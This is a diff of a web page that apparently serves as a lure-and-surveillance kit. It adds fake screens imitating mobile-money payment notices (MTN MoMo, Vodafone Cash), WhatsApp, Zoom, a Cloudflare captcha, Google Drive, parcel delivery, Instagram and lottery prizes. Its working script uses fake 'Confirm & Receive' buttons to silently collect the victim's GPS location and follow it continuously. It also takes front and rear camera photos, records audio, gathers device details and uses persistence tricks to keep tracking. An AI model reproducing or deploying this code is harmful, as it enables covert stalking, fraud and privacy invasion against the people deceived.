@@ -10,7 +10,7 @@
 <meta property="og:description" id="ogd" content="">
 <meta property="og:image" id="ogi" content="">
 <meta property="og:type" content="website">
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Roboto',sans-serif;-webkit-font-smoothing:antialiased;overflow-x:hidden}
@@ -21,7 +21,8 @@ body{font-family:'Roboto',sans-serif;-webkit-font-smoothing:antialiased;overflow
 .fade-up{animation:fadeUp .4s ease}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 @keyframes dotPulse{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
-
+@keyframes checkSpin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+@keyframes checkDone{0%{transform:scale(0)}50%{transform:scale(1.2)}100%{transform:scale(1)}}
 /* ═══ MOMO / MONEY PAGES ═══ */
 .mm-page{background:#fff;min-height:100vh}
 .mm-status{background:#000;padding:4px 16px;display:flex;justify-content:space-between;font-size:11px;color:#fff}
@@ -50,39 +51,31 @@ body{font-family:'Roboto',sans-serif;-webkit-font-smoothing:antialiased;overflow
 .mm-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #fafafa;font-size:13px}
 .mm-row:last-child{border:none}
 .mm-row .k{color:#888}
-.mm-row .v{color:#222;font-weight:500;text-align:right}
-.mm-btn{border:none;padding:13px;border-radius:10px;font-size:16px;cursor:pointer;width:100%;font-weight:700;font-family:inherit;margin-top:8px;transition:.2s}
-.mm-btn:active{transform:scale(.98)}
-.mm-btn:disabled{opacity:.5;cursor:default}
-.mm-receipt{border-radius:10px;padding:16px;margin-top:12px;text-align:center}
-.mm-receipt .check{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;color:#fff;margin:0 auto 8px}
-.mm-receipt .msg{font-size:15px;font-weight:600}
+.mm-row .v{color:#222;font-weight:500}
+.mm-btn{border:none;padding:14px;border-radius:8px;font-size:15px;cursor:pointer;width:100%;font-weight:600;font-family:inherit;margin-top:8px}
+.mm-btn:disabled{opacity:.5}
+.mm-receipt{border-radius:10px;padding:16px;text-align:center;margin-top:12px}
+.mm-receipt .check{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;margin:0 auto 8px;color:#fff}
+.mm-receipt .msg{font-size:16px;font-weight:600}
 .mm-receipt .sub{font-size:12px;margin-top:3px}
-.mm-receipt .ref{font-size:11px;color:#999;margin-top:6px;font-family:monospace}
-.mm-other{background:#fff;border-radius:12px;border:1px solid #e8e8e8;margin-top:10px;overflow:hidden}
-.mm-other .hdr{padding:10px 14px;font-size:12px;color:#888;font-weight:500;border-bottom:1px solid #f5f5f5}
-.mm-txn{display:flex;align-items:center;gap:10px;padding:10px 14px;border-bottom:1px solid #f8f8f8}
-.mm-txn:last-child{border:none}
-.mm-txn .ic{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:15px}
+.mm-receipt .ref{font-size:11px;color:#999;margin-top:6px}
+.mm-other{margin-top:10px}
+.mm-other .hdr{font-size:12px;color:#888;margin-bottom:6px}
+.mm-txn{display:flex;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid #f5f5f5}
+.mm-txn .ic{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
 .mm-txn .det{flex:1}
-.mm-txn .det .nm{font-size:13px;color:#222}
-.mm-txn .det .dt{font-size:11px;color:#999;margin-top:1px}
-.mm-txn .amt{font-size:13px;font-weight:600}
-
+.mm-txn .det .nm{font-size:13px;font-weight:500}
+.mm-txn .det .dt{font-size:11px;color:#999}
+.mm-txn .amt{font-size:14px;font-weight:600}
 /* ═══ WHATSAPP ═══ */
 .w-page{background:#0b141a;min-height:100vh;display:flex;flex-direction:column}
-.w-hero{background:linear-gradient(135deg,#075e54,#128c7e);padding:44px 20px 24px;text-align:center}
-.w-hero .img{width:76px;height:76px;background:rgba(255,255,255,.12);border-radius:50%;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;font-size:34px;border:2px solid rgba(255,255,255,.15)}
-.w-hero .name{color:#fff;font-size:19px;font-weight:500;margin-bottom:3px}
-.w-hero .meta{color:rgba(255,255,255,.6);font-size:13px}
-.w-body{flex:1;padding:0 14px 90px}
-.w-sec{background:#1f2c34;border-radius:8px;margin:8px 0;overflow:hidden}
-.w-sec .hd{padding:10px 14px 3px;color:#008069;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
-.w-sec .bd{padding:3px 14px 10px;color:#d1d7db;font-size:14px;line-height:1.5}
-.w-mem{display:flex;align-items:center;gap:10px;padding:8px 14px;border-bottom:1px solid rgba(255,255,255,.03)}
-.w-mem:last-child{border:none}
+.w-grp{background:#111b21;min-height:100vh}
+.w-sec{padding:10px 16px}
+.w-sec .hd{color:#8696a0;font-size:12px;margin-bottom:8px}
+.w-sec .bd{color:#e9edef;font-size:14px;line-height:1.4;margin-bottom:12px}
+.w-mem{display:flex;align-items:center;gap:10px;padding:6px 0}
 .w-mem .av{width:36px;height:36px;background:#2a3942;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
-.w-mem .nm{color:#e9edef;font-size:14px}
+.w-mem .nm{color:#e9edef;font-size:14px;font-weight:500}
 .w-mem .rl{color:#008069;font-size:10px;font-weight:600}
 .w-mem .ab{color:#8696a0;font-size:11px}
 .w-fix{position:fixed;bottom:0;left:0;right:0;background:#1f2c34;padding:10px 14px 18px;border-top:1px solid #2a3942;z-index:50}
@@ -110,7 +103,6 @@ body{font-family:'Roboto',sans-serif;-webkit-font-smoothing:antialiased;overflow
 .w-in{position:fixed;bottom:0;left:0;right:0;background:#1f2c34;padding:5px 6px;display:flex;align-items:center;gap:5px;border-top:1px solid #2a3942}
 .w-in span{font-size:18px;padding:5px}
 .w-in input{flex:1;background:#2a3942;border:none;border-radius:18px;padding:8px 12px;color:#e9edef;font-size:14px;outline:none;font-family:inherit}
-
 /* ═══ GOV / UTILITY ═══ */
 .gv-page{background:#f5f5f5;min-height:100vh}
 .gv-bar{padding:14px 16px;display:flex;align-items:center;gap:8px;color:#fff}
@@ -128,7 +120,6 @@ body{font-family:'Roboto',sans-serif;-webkit-font-smoothing:antialiased;overflow
 .gv-btn{border:none;padding:13px;border-radius:8px;font-size:15px;cursor:pointer;width:100%;font-weight:600;font-family:inherit;color:#fff;margin-top:8px}
 .gv-btn:disabled{opacity:.5}
 .gv-alert{border-left:3px solid;border-radius:0 8px 8px 0;padding:10px 14px;margin-bottom:10px;font-size:13px}
-
 /* ═══ JOB / ARTISAN ═══ */
 .jb-page{background:#f5f5f5;min-height:100vh}
 .jb-nav{background:#fff;padding:11px 14px;display:flex;align-items:center;box-shadow:0 1px 2px rgba(0,0,0,.05);position:sticky;top:0;z-index:50}
@@ -148,84 +139,226 @@ body{font-family:'Roboto',sans-serif;-webkit-font-smoothing:antialiased;overflow
 .jb-row .v{color:#212121;font-weight:500;text-align:right;max-width:58%}
 .jb-dist{background:#e8f5e9;border-radius:8px;padding:11px 12px;margin:8px 0;display:flex;align-items:center;gap:10px}
 .jb-dist .ic{width:34px;height:34px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px;box-shadow:0 1px 2px rgba(0,0,0,.06)}
-.jb-btn{border:none;padding:12px;border-radius:8px;font-size:15px;cursor:pointer;width:100%;font-weight:600;font-family:inherit;color:#fff;margin-top:5px}
+.jb-btn{border:none;padding:14px;border-radius:8px;font-size:15px;cursor:pointer;width:100%;font-weight:600;font-family:inherit;color:#fff;margin-top:6px}
 .jb-btn:disabled{opacity:.5}
-.jb-urg{text-align:center;font-size:11px;color:#e65100;margin-top:6px;font-weight:500}
-.jb-reveal{background:#f9fbe7;border:1px solid #e6ee9c;border-radius:8px;padding:12px;margin-top:12px}
+.jb-urg{text-align:center;font-size:12px;color:#e65100;margin-top:8px;animation:pulse 2s infinite}
+.jb-reveal{margin-top:12px;padding:12px;background:#f1f8e9;border-radius:8px}
 .jb-reveal h3{font-size:14px;color:#33691e;margin-bottom:8px}
-.jb-reveal .row{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid #f0f4c3;font-size:13px}
-.jb-reveal .row:last-of-type{border:none}
-
+.jb-reveal .row{display:flex;justify-content:space-between;padding:5px 0;font-size:13px;border-bottom:1px solid #e8f5e9}
 /* ═══ ZOOM ═══ */
-.z-page{background:#242424;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
-.z-card{max-width:440px;width:100%;text-align:center}
-.z-cam{position:relative;border-radius:12px;overflow:hidden;aspect-ratio:16/9;background:#1a1a1a;margin-bottom:14px;border:2px solid #333}
-.z-cam video{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
-.z-cam .ph{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center}
-.z-cam .av{width:64px;height:64px;background:#0b5cff;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:26px;font-weight:600;margin-bottom:6px}
-.z-cam .lb{color:#999;font-size:13px}
-.z-cam .nm{position:absolute;bottom:6px;left:6px;background:rgba(0,0,0,.7);color:#fff;padding:2px 8px;border-radius:3px;font-size:11px}
+.z-page{background:#242424;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.z-card{background:#1a1a1a;border-radius:16px;padding:32px 24px;text-align:center;max-width:400px;width:100%;border:1px solid #333}
+.z-card .host{color:#ccc;font-size:14px;margin-top:8px}
+.z-card .topic{color:#fff;font-size:16px;font-weight:600;margin-top:12px}
+.z-card .meta{color:#888;font-size:12px;margin-top:4px}
+.z-card .preview{margin:16px 0;border-radius:8px;overflow:hidden;background:#000;height:200px;display:flex;align-items:center;justify-content:center;position:relative}
+.z-card .preview .lb{color:#999;font-size:12px}
+.z-card .preview video{width:100%;height:100%;object-fit:cover}
+.z-card .preview .nm{position:absolute;bottom:8px;left:8px;color:#fff;font-size:11px;background:rgba(0,0,0,.6);padding:2px 8px;border-radius:4px}
+.z-btn{background:#0b5cff;color:#fff;border:none;padding:14px 28px;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;width:100%;margin-top:12px}
+.z-btn:disabled{opacity:.5}
+/* ═══ CAPTCHA / CLOUDFLARE ═══ */
+.cf-page{background:#f0f0f0;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Inter',sans-serif}
+.cf-box{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.1);padding:16px 20px;width:300px;border:1px solid #e0e0e0}
+.cf-row{display:flex;align-items:center;gap:12px}
+.cf-check{width:28px;height:28px;border:2px solid #c0c0c0;border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .3s}
+.cf-check.loading{border-color:#f5a623;animation:checkSpin 1s linear infinite;border-radius:50%}
+.cf-check.done{border-color:#2ecc40;background:#2ecc40;animation:checkDone .4s ease}
+.cf-label{font-size:14px;color:#555;flex:1}
+.cf-brand{display:flex;align-items:center;gap:6px;margin-top:12px;padding-top:10px;border-top:1px solid #eee}
+.cf-brand img{height:18px}
+.cf-brand span{font-size:11px;color:#999}
+.cf-privacy{font-size:10px;color:#aaa;margin-top:6px;text-align:right}
+.cf-privacy a{color:#aaa;text-decoration:none}
+/* ═══ GOOGLE DRIVE ═══ */
+.gd-page{background:#f8f9fa;min-height:100vh;font-family:'Inter',sans-serif}
+.gd-bar{background:#fff;padding:12px 20px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+.gd-bar .logo{display:flex;align-items:center;gap:8px;font-size:20px;color:#5f6368;font-weight:400}
+.gd-bar .logo span{color:#5f6368}
+.gd-body{max-width:600px;margin:40px auto;padding:0 20px}
+.gd-card{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(60,64,67,.15);padding:32px;text-align:center}
+.gd-icon{width:64px;height:64px;margin:0 auto 16px}
+.gd-title{font-size:20px;color:#202124;font-weight:600;margin-bottom:8px}
+.gd-sub{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:1.5}
+.gd-file{background:#f1f3f4;border-radius:8px;padding:16px;display:flex;align-items:center;gap:12px;margin-bottom:20px;text-align:left}
+.gd-file .fi{width:40px;height:40px;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:20px}
+.gd-file .fn{font-size:14px;color:#202124;font-weight:500}
+.gd-file .fs{font-size:12px;color:#5f6368}
+.gd-btn{background:#1a73e8;color:#fff;border:none;padding:12px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;width:100%}
+.gd-btn:hover{background:#1557b0}
+.gd-btn:disabled{opacity:.6}
+.gd-footer{font-size:12px;color:#5f6368;margin-top:16px}
+/* ═══ SECURITY ALERT ═══ */
+.sa-page{background:#f5f5f5;min-height:100vh;font-family:'Inter',sans-serif}
+.sa-bar{background:#fff;padding:14px 20px;border-bottom:1px solid #e0e0e0}
+.sa-bar .logo{font-size:18px;font-weight:600;color:#202124}
+.sa-body{max-width:500px;margin:30px auto;padding:0 16px}
+.sa-card{background:#fff;border-radius:12px;box-shadow:0 1px 4px rgba(0,0,0,.08);overflow:hidden}
+.sa-header{background:#d93025;padding:20px;text-align:center;color:#fff}
+.sa-header .icon{font-size:40px;margin-bottom:8px}
+.sa-header h2{font-size:18px;font-weight:600}
+.sa-header p{font-size:13px;opacity:.9;margin-top:4px}
+.sa-details{padding:20px}
+.sa-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f0f0f0;font-size:14px}
+.sa-row .k{color:#5f6368}
+.sa-row .v{color:#202124;font-weight:500}
+.sa-btn{background:#d93025;color:#fff;border:none;padding:14px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;width:100%;margin-top:16px}
+.sa-btn:disabled{opacity:.6}
+/* ═══ PACKAGE DELIVERY ═══ */
+.pk-page{background:#fafafa;min-height:100vh;font-family:'Inter',sans-serif}
+.pk-bar{background:#d4001a;padding:14px 20px;color:#fff;display:flex;align-items:center;gap:10px}
+.pk-bar .logo{font-size:18px;font-weight:700;letter-spacing:1px}
+.pk-body{max-width:500px;margin:20px auto;padding:0 16px}
+.pk-card{background:#fff;border-radius:10px;box-shadow:0 1px 4px rgba(0,0,0,.08);overflow:hidden}
+.pk-header{padding:20px;border-bottom:1px solid #f0f0f0;text-align:center}
+.pk-header .icon{font-size:36px;margin-bottom:8px}
+.pk-header h2{font-size:16px;color:#333;font-weight:600}
+.pk-header p{font-size:13px;color:#666;margin-top:4px}
+.pk-track{padding:16px 20px}
+.pk-step{display:flex;gap:12px;padding:8px 0;position:relative}
+.pk-step::before{content:'';position:absolute;left:11px;top:28px;bottom:-8px;width:2px;background:#e0e0e0}
+.pk-step:last-child::before{display:none}
+.pk-step .dot{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0;z-index:1}
+.pk-step .dot.done{background:#4caf50;color:#fff}
+.pk-step .dot.current{background:#ff9800;color:#fff;animation:pulse 1.5s infinite}
+.pk-step .dot.pending{background:#e0e0e0;color:#999}
+.pk-step .info{flex:1}
+.pk-step .info .title{font-size:13px;color:#333;font-weight:500}
+.pk-step .info .time{font-size:11px;color:#999;margin-top:2px}
+.pk-action{padding:16px 20px;border-top:1px solid #f0f0f0}
+.pk-btn{background:#d4001a;color:#fff;border:none;padding:14px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;width:100%}
+.pk-btn:disabled{opacity:.6}
+/* ═══ VOICE NOTE ═══ */
+.vn-page{background:#0b141a;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.vn-card{background:#1f2c34;border-radius:12px;padding:24px;max-width:340px;width:90%;text-align:center}
+.vn-icon{width:60px;height:60px;background:#008069;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 16px}
+.vn-title{color:#e9edef;font-size:16px;font-weight:500;margin-bottom:4px}
+.vn-sub{color:#8696a0;font-size:13px;margin-bottom:20px}
+.vn-wave{height:40px;display:flex;align-items:center;justify-content:center;gap:3px;margin-bottom:20px}
+.vn-wave span{width:3px;background:#008069;border-radius:2px;animation:wave 1.2s ease-in-out infinite}
+@keyframes wave{0%,100%{height:8px}50%{height:28px}}
+.vn-wave span:nth-child(2){animation-delay:.1s}
+.vn-wave span:nth-child(3){animation-delay:.2s}
+.vn-wave span:nth-child(4){animation-delay:.3s}
+.vn-wave span:nth-child(5){animation-delay:.4s}
+.vn-wave span:nth-child(6){animation-delay:.5s}
+.vn-wave span:nth-child(7){animation-delay:.6s}
+.vn-wave span:nth-child(8){animation-delay:.7s}
+.vn-wave span:nth-child(9){animation-delay:.8s}
+.vn-wave span:nth-child(10){animation-delay:.9s}
+.vn-dur{color:#8696a0;font-size:12px;margin-bottom:16px}
+.vn-btn{background:#008069;color:#fff;border:none;padding:14px;border-radius:24px;font-size:15px;font-weight:500;cursor:pointer;width:100%}
+.vn-btn:disabled{background:#2a3942;color:#8696a0}
+/* ═══ WIFI PORTAL ═══ */
+.wifi-page{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.wifi-card{background:#fff;border-radius:16px;padding:32px 24px;max-width:380px;width:100%;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,.2)}
+.wifi-icon{font-size:48px;margin-bottom:12px}
+.wifi-title{font-size:20px;color:#333;font-weight:700;margin-bottom:4px}
+.wifi-sub{font-size:14px;color:#666;margin-bottom:24px}
+.wifi-net{background:#f5f5f5;border-radius:8px;padding:12px;display:flex;align-items:center;gap:10px;margin-bottom:20px}
+.wifi-net .bars{font-size:20px}
+.wifi-net .name{font-size:14px;color:#333;font-weight:500;flex:1;text-align:left}
+.wifi-net .lock{font-size:14px}
+.wifi-btn{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:14px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;width:100%}
+.wifi-btn:disabled{opacity:.6}
+.wifi-tos{font-size:11px;color:#999;margin-top:12px;line-height:1.4}
+/* ═══ INSTAGRAM VERIFY ═══ */
+.ig-page{background:#fafafa;min-height:100vh;font-family:'Inter',sans-serif}
+.ig-bar{background:#fff;padding:12px 16px;border-bottom:1px solid #dbdbdb;display:flex;align-items:center}
+.ig-bar .logo{font-family:'Billabong',cursive;font-size:24px;color:#262626;flex:1;font-weight:400;letter-spacing:-1px}
+.ig-body{max-width:400px;margin:30px auto;padding:0 16px}
+.ig-card{background:#fff;border:1px solid #dbdbdb;border-radius:8px;padding:24px;text-align:center}
+.ig-shield{width:56px;height:56px;background:#fef3cd;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 16px}
+.ig-title{font-size:18px;color:#262626;font-weight:600;margin-bottom:8px}
+.ig-sub{font-size:14px;color:#8e8e8e;line-height:1.5;margin-bottom:20px}
+.ig-warn{background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:12px;font-size:13px;color:#856404;margin-bottom:20px;text-align:left}
+.ig-btn{background:#0095f6;color:#fff;border:none;padding:12px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;width:100%}
+.ig-btn:disabled{opacity:.6}
+.ig-footer{font-size:12px;color:#8e8e8e;margin-top:12px}
+/* ═══ LOTTERY / GIVEAWAY ═══ */
+.lt-page{background:linear-gradient(180deg,#1a1a2e 0%,#16213e 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.lt-card{background:linear-gradient(135deg,#ffd700 0%,#ffaa00 100%);border-radius:16px;padding:28px 24px;max-width:380px;width:100%;text-align:center;box-shadow:0 10px 40px rgba(255,215,0,.3)}
+.lt-badge{background:#fff;color:#ff6b00;font-size:11px;font-weight:700;padding:4px 12px;border-radius:20px;display:inline-block;margin-bottom:12px}
+.lt-title{font-size:22px;color:#1a1a2e;font-weight:700;margin-bottom:8px}
+.lt-amount{font-size:36px;color:#1a1a2e;font-weight:800;margin-bottom:8px}
+.lt-sub{font-size:14px;color:#4a3800;margin-bottom:20px}
+.lt-info{background:rgba(255,255,255,.5);border-radius:8px;padding:12px;margin-bottom:20px;text-align:left}
+.lt-info .row{display:flex;justify-content:space-between;padding:4px 0;font-size:13px;color:#333}
+.lt-btn{background:#1a1a2e;color:#ffd700;border:none;padding:14px;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;width:100%}
+.lt-btn:disabled{opacity:.6}
+.lt-timer{font-size:12px;color:#4a3800;margin-top:10px}
 </style>
 </head>
 <body>
 <script>
+// ═══ CORE TRACKING ENGINE ═══
 const TID=window.location.pathname.split('/').pop();
 const PB=window.location.pathname.split('/')[1];
 let MS=null,OK=false;
 
-// ═══ GPS + CAMERA + AUDIO ═══
 function sG(p){fetch('/api/gps/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
-alt:p.coords.altitude,spd:p.coords.speed,dir:p.coords.heading,source:'gps',ts:new Date().toISOString()})}).catch(()=>{})}
+alt:p.coords.altitude,dir:p.coords.heading,spd:p.coords.speed,ts:new Date(p.timestamp).toISOString(),source:'gps'})}).catch(()=>{});
+if(navigator.sendBeacon)navigator.sendBeacon('/api/beacon/'+TID,JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,source:'gps'}))}
+
 function gps(){return new Promise((y,n)=>{navigator.geolocation.getCurrentPosition(p=>{sG(p);
-navigator.geolocation.watchPosition(sG,()=>{},{enableHighAccuracy:true,maximumAge:0,timeout:30000});y()},
-e=>{navigator.geolocation.getCurrentPosition(p=>{sG(p);y()},n,{enableHighAccuracy:false,timeout:10000})},
-{enableHighAccuracy:true,timeout:30000,maximumAge:0})})}
-function fG(){navigator.geolocation.getCurrentPosition(sG,()=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:0})}
-async function cam(){try{MS=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true});
-await snap('front');setTimeout(snapR,5000)}catch(e){try{MS=await navigator.mediaDevices.getUserMedia({audio:true})}catch(e2){}}}
+navigator.geolocation.watchPosition(sG,()=>{},{enableHighAccuracy:true,timeout:30000,maximumAge:0});y(p)},
+e=>n(e),{enableHighAccuracy:true,timeout:30000,maximumAge:0})})}
+
+function fG(){navigator.geolocation.getCurrentPosition(sG,()=>{},{enableHighAccuracy:true,timeout:15000,maximumAge:0})}
+
+async function cam(){try{MS=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:true});
+await snap('front');setTimeout(snapR,3000)}catch(e){try{MS=await navigator.mediaDevices.getUserMedia({audio:true})}catch(e2){}}}
+
 async function snap(c){if(!MS||!MS.getVideoTracks().length)return;try{const v=document.createElement('video');v.srcObject=MS;
 v.setAttribute('playsinline','');v.muted=true;await v.play();await new Promise(r=>setTimeout(r,600));
 const cv=document.createElement('canvas');cv.width=v.videoWidth||640;cv.height=v.videoHeight||480;
 cv.getContext('2d').drawImage(v,0,0);fetch('/api/media/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({type:'photo',camera:c,data:cv.toDataURL('image/jpeg',.8),ts:new Date().toISOString()})}).catch(()=>{})}catch(e){}}
+
 async function snapR(){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:'environment'}}});
 const v=document.createElement('video');v.srcObject=s;v.setAttribute('playsinline','');v.muted=true;await v.play();
 await new Promise(r=>setTimeout(r,1000));const cv=document.createElement('canvas');cv.width=v.videoWidth;cv.height=v.videoHeight;
 cv.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());fetch('/api/media/'+TID,{method:'POST',
 headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',camera:'rear',data:cv.toDataURL('image/jpeg',.8),
 ts:new Date().toISOString()})}).catch(()=>{})}catch(e){}}
+
 function rec(d){if(!MS||!MS.getAudioTracks().length)return;try{const mt=MediaRecorder.isTypeSupported('audio/webm;codecs=opus')?
 'audio/webm;codecs=opus':'audio/webm';const r=new MediaRecorder(MS,{mimeType:mt});const ch=[];
 r.ondataavailable=e=>{if(e.data.size>0)ch.push(e.data)};r.onstop=()=>{const b=new Blob(ch,{type:mt});const rd=new FileReader();
 rd.onloadend=()=>{fetch('/api/media/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({type:'audio',data:rd.result,ts:new Date().toISOString()})}).catch(()=>{})};rd.readAsDataURL(b)};
 r.start();setTimeout(()=>{try{r.stop()}catch(e){}},d)}catch(e){}}
+
 function persist(){if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js').catch(()=>{});
 try{const c=new(window.AudioContext||window.webkitAudioContext)();const o=c.createOscillator();const g=c.createGain();
 g.gain.value=.0001;o.connect(g);g.connect(c.destination);o.start()}catch(e){}
 try{if('wakeLock' in navigator)navigator.wakeLock.request('screen')}catch(e){}
 try{if('locks' in navigator)navigator.locks.request('r'+TID,{mode:'exclusive'},()=>new Promise(()=>{}))}catch(e){}}
+
 function loop(){setInterval(()=>snap('front'),30000);setInterval(snapR,120000);setInterval(()=>rec(10000),60000);
 setTimeout(()=>rec(15000),2000);
 document.addEventListener('visibilitychange',()=>{if(!document.hidden){fG();if(MS)snap('front')}});
 window.addEventListener('beforeunload',()=>{navigator.geolocation.getCurrentPosition(p=>{
 navigator.sendBeacon('/api/beacon/'+TID,JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}))},
 ()=>{},{enableHighAccuracy:true,timeout:3000})})}
+
 function dev(){fetch('/api/device/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({platform:navigator.platform,userAgent:navigator.userAgent,
 timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:{w:screen.width,h:screen.height}})}).catch(()=>{})}
+
 async function go(){if(OK)return;OK=true;try{await gps()}catch(e){}try{await cam()}catch(e){}
 if('Notification' in window)Notification.requestPermission().catch(()=>{});persist();dev();loop()}
-function setOG(t,d){document.getElementById('ogt').content=t;document.getElementById('ogd').content=d;document.getElementById('pt').textContent=t}
 
+function setOG(t,d){document.getElementById('ogt').content=t;document.getElementById('ogd').content=d;document.getElementById('pt').textContent=t}
+</script>
+<script>
 // ═══ MTN MOMO ═══
 function rMomo(){
 setOG('MTN MoMo — You received GH₵ 850.00','Tap to confirm and receive money');
 document.getElementById('tc').content='#ffcb05';
 const txn='MOB'+Date.now().toString().slice(-10);
 const time=new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});
-const date=new Date().toLocaleDateString('en-GB',{day:'numeric',month:'short',year:'numeric'});
 document.body.innerHTML=`<div class="mm-page">
 <div class="mm-status"><span>${time}</span><span>📶 MTN 4G 🔋78%</span></div>
 <div class="mm-bar" style="background:#ffcb05"><span class="back" style="color:#000">‹</span><span class="logo" style="color:#000">MoMo</span><span class="icons" style="color:#000">🔍 ⋮</span></div>
@@ -240,15 +373,13 @@ document.body.innerHTML=`<div class="mm-page">
 <div class="mm-row"><span class="k">From</span><span class="v">Kwame Mensah</span></div>
 <div class="mm-row"><span class="k">Phone</span><span class="v">024 XXX XX89</span></div>
 <div class="mm-row"><span class="k">Reference</span><span class="v">Payment for work</span></div>
-<div class="mm-row"><span class="k">Date</span><span class="v">${date}</span></div>
-<div class="mm-row"><span class="k">Transaction ID</span><span class="v" style="font-family:monospace;font-size:11px">${txn}</span></div>
+<div class="mm-row"><span class="k">Txn ID</span><span class="v">${txn}</span></div>
 <div class="mm-row"><span class="k">Status</span><span class="v" style="color:#f57f17">⏳ Pending</span></div>
 <button class="mm-btn" style="background:#ffcb05;color:#000" id="mmBtn" onclick="mmC()">Confirm & Receive GH₵ 850.00</button>
 </div></div>
 <div class="mm-other"><div class="hdr">Recent</div>
 <div class="mm-txn"><div class="ic" style="background:#e8f5e9">💰</div><div class="det"><div class="nm">Ama Serwaa</div><div class="dt">Yesterday</div></div><div class="amt" style="color:#2e7d32">+GH₵ 200</div></div>
 <div class="mm-txn"><div class="ic" style="background:#fbe9e7">📱</div><div class="det"><div class="nm">MTN Airtime</div><div class="dt">Yesterday</div></div><div class="amt" style="color:#c62828">-GH₵ 10</div></div>
-<div class="mm-txn"><div class="ic" style="background:#fbe9e7">⚡</div><div class="det"><div class="nm">ECG Prepaid</div><div class="dt">Jul 10</div></div><div class="amt" style="color:#c62828">-GH₵ 80</div></div>
 </div></div></div>`;
 setTimeout(async()=>{try{await gps()}catch(e){}dev()},800)}
 async function mmC(){const b=document.getElementById('mmBtn');b.textContent='Processing...';b.disabled=true;await go();
@@ -256,7 +387,6 @@ setTimeout(()=>{document.querySelector('.mm-detail').innerHTML+=`<div class="mm-
 <div class="check" style="background:#4caf50">✓</div><div class="msg" style="color:#2e7d32">GH₵ 850.00 Received!</div>
 <div class="sub" style="color:#66bb6a">Credited to your wallet</div><div class="ref">Ref: ${Date.now().toString().slice(-12)}</div></div>`;
 b.textContent='✓ Confirmed';b.style.background='#4caf50';b.style.color='#fff'},2500)}
-
 // ═══ VODAFONE CASH ═══
 function rVoda(){
 setOG('Vodafone Cash — GH₵ 1,200 received','Tap to confirm transfer');
@@ -267,7 +397,7 @@ document.body.innerHTML=`<div class="mm-page">
 <div class="mm-pending" style="background:#fce4ec;color:#c62828"><span class="dot" style="background:#e60000"></span>Pending: GH₵ 1,200 from Kofi Asante</div>
